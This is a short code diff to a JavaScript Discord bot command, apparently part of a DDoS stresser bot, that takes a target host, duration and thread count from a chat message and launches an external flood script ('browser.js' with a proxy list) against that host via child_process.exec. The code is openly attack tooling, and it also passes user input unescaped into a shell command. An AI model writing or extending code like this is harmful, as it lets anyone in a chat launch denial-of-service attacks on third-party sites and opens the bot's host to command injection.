@@ -4,6 +4,7 @@ exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
 const duration = message.content.split (" ")[2]
+const threads = message.content.split (" ")[3]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -24,7 +25,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node HTTP-RAW.js ${host} ${duration}`, (error, stdout, stderr) => {
+exec(`node browser.js ${host} proxy.txt ${duration} ${threads} 50`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
